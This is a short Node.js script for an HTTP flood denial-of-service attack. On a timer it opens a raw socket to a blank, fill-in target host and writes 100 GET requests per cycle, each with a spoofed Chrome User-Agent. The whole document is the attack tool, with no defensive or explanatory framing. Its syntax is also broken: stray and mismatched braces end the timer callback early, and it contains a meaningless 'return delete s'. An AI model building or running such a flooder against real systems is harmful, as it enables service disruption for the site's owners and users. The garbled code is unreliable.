const net = require("net")
const s = new net.Socket()
var target = ""
var port = 80
var host = ""
var ua = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"

setInterval(()=>{
	
	s.connect(port,host)
	s.setTimeout(10000)
	for(let i=0;i<100;i++){
		s.write('GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		}
	}
	s.on('data',()=>{
		setTimeout(()=>{
			s.destroy();
		  return delete s
		},5000)
	})
	
	
	
	
})
